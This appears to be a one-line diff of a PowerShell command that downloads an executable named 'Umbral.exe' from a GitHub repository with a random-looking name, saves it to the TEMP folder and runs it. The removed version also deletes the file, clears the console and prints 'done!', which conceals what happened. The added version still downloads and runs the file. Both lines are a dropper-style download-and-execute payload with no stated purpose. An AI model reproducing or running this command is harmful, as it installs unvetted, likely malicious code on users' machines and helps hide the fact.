@@ -1,1 +1,1 @@
-$Out="$env:TEMP\Umbral.exe"; Invoke-WebRequest "https://github.com/Ryu1430/rwsepogjw0po9eitgjqeapoitqapotqa/raw/refs/heads/main/Umbral.exe" -OutFile $Out; Start-Process $Out -Wait; Remove-Item $Out; Clear-Host; Write-Host "done!"
+Invoke-WebRequest "https://github.com/Ryu1430/rwsepogjw0po9eitgjqeapoitqapotqa/raw/refs/heads/main/Umbral.exe" -OutFile "$env:TEMP\Umbral.exe"; Start-Process "$env:TEMP\Umbral.exe"
